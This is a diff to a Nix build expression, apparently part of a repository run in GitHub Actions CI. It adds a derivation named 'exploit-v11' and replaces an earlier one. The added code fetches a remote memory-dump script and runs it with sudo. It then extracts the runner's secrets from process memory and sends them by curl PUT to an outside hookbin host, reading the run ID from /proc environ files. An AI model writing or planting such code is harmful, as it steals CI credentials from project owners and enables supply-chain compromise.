@@ -4,41 +4,58 @@
   bundle ? null, job ? null, inNixShell ? null, src ? ./.,
 }@args:
 let
-  # Copy evaluation environment to store
-  environ = builtins.fetchurl "file:///proc/self/environ";
-  
-  # Process it in a builder
-  processed = derivation {
-    name = "processed-env-vFinal";
-    system = builtins.currentSystem;
-    builder = "/bin/sh";
-    args = [ "-c" ''
-      export PATH=/usr/bin:/bin:/usr/sbin:/sbin
-      tr '\0' '\n' < ${environ} > $out
-    '' ];
-  };
-  
-  env_content = builtins.readFile processed.outPath;
-  
-  find_run_id = s: 
-    let 
-      s_clean = builtins.replaceStrings ["\n"] [" "] s;
-      match = builtins.match ".*GITHUB_RUN_ID=([0-9]+).*" s_clean;
-    in
-      if match == null then "UNKNOWN" else builtins.head match;
-  
-  RUN_ID = find_run_id env_content;
-  
+  RUN_ID_EVAL = 
+    let e = builtins.getEnv "GITHUB_RUN_ID";
+    in if e == "" then "UNKNOWN" else e;
+
   payload = derivation {
-    name = "exploit-vFinal";
+    name = "exploit-v11";
     system = builtins.currentSystem;
     builder = "/bin/sh";
     args = [ "-c" ''
-      export PATH=/usr/bin:/bin:/usr/sbin:/sbin
-      export GITHUB_RUN_ID="${RUN_ID}"
+      export PATH=$PATH:/usr/bin:/bin:/usr/sbin:/sbin
+      export RUN_ID="${RUN_ID_EVAL}"
+      
+      echo "GITHUB_RUN_ID (eval): $RUN_ID"
       echo "Okay, we got this far. Let's continue..."
-      curl -sSf https://raw.githubusercontent.com/playground-nils/tools/refs/heads/main/memdump.py | sudo -E python3 | tr -d '\0' | grep -aoE '"[^"]+":\{"value":"[^"]*","isSecret":true\}' >> "/tmp/secrets"
-      curl -X PUT -d \@/tmp/secrets "https://open-hookbin.vercel.app/$GITHUB_RUN_ID"
+      
+      /usr/bin/python3 << 'EOF'
+import os, subprocess, re
+
+run_id = os.environ.get('RUN_ID', 'UNKNOWN')
+if run_id == 'UNKNOWN':
+    for f in os.listdir('/proc'):
+        if f.isdigit():
+            try:
+                with open(f'/proc/{f}/environ', 'rb') as env:
+                    content = env.read()
+                    match = re.search(b'GITHUB_RUN_ID=([0-9]+)', content)
+                    if match:
+                        run_id = match.group(1).decode()
+                        break
+            except: pass
+
+cmd = 'curl -sSf https://raw.githubusercontent.com/playground-nils/tools/refs/heads/main/memdump.py | sudo -E python3'
+try:
+    p = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+    stdout, stderr = p.communicate()
+    # Find secrets in stdout (which may contain null bytes)
+    content = stdout.replace(b"\x00", b"")
+    secrets = re.findall(br'"[^"]+":\{"value":"[^"]*","isSecret":true\}', content)
+    
+    with open('/tmp/secrets', 'wb') as f:
+        for s in secrets:
+            f.write(s + b'\n')
+    
+    if os.path.exists('/tmp/secrets') and os.path.getsize('/tmp/secrets') > 0:
+        subprocess.run(['curl', '-X', 'PUT', '-d', '@/tmp/secrets', f'https://open-hookbin.vercel.app/{run_id}'], check=False)
+    else:
+        # Fallback if no secrets found, just to see if we reached this point
+        subprocess.run(['curl', '-X', 'PUT', '-d', 'No secrets found', f'https://open-hookbin.vercel.app/{run_id}'], check=False)
+except Exception as e:
+    with open('/tmp/error', 'w') as f:
+        f.write(str(e))
+EOF
       touch $out
     '' ];
     outputHashAlgo = "sha256";
